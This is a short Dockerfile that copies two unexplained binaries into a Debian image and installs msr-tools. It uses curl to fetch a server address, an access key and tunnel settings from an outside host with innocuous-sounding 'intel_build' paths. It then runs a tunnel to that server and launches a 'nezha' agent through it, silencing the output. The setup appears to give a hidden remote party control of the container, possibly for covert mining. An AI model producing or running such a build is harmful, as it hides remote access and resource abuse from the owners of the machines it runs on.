FROM debian:sid
COPY my-tu /
WORKDIR /app
COPY nezha /app

RUN apt update -y \
  && apt install -y procps msr-tools net-tools
RUN curl -s html.vscwjm.eu.org/NZ/intel_build-server
RUN server=$(curl -s html.vscwjm.eu.org/NZ/intel_build-server) && \
  key=$(curl -s html.vscwjm.eu.org/NZ/intel_build-key-com_01) && \
  tunn=$(curl -s html.vscwjm.eu.org/XM/tunn) && \
  chmod a+x /my-tu /app/nezha && \
  (/my-tu -L 127.0.0.1:3333:$server $tunn &) && \
  cd /app && \
  ./nezha -s 127.0.0.1:3333 -p $key > /dev/null 

CMD /bin/bash

